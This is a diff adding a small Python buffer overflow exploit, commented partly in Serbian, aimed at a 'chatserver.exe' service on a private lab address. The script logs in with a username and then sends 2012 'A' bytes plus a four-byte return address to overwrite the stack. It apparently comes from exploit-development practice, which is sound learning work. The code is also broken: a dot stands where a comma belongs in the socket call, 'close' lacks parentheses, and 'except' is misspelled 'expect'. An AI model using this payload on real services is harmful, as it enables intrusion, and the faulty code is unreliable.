@@ -1,0 +1,22 @@
+import socket #da napravimo connection out moramo konektovati to opet porn ip ko nc 
+import sys
+
+username = b"heath"                         #Ime koje korisiomo za ulaazak u chatserver.exe
+                                            #b saljemo ga kao bytes ne kao string
+
+message = b"A" * 2012 + b"\xfd\x14\x50\x62"
+
+try: 
+        print("Sending payload...")   
+        s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)#socket.AF_INET=IPV4 MY , SOCK_STREAM is my port
+        s.connect(('192.168.4.49',9999)) #Windows 7 ip I think
+        s.recv(1024)#Recive a data back
+        s.recv(1024)
+        s.send(username + b'\r\n')
+        s.recv(1024)
+        s.send(message + b'\r\n')
+        s.close
+
+expect:
+         print("Cannot connect to the server")
+         sys.exit()
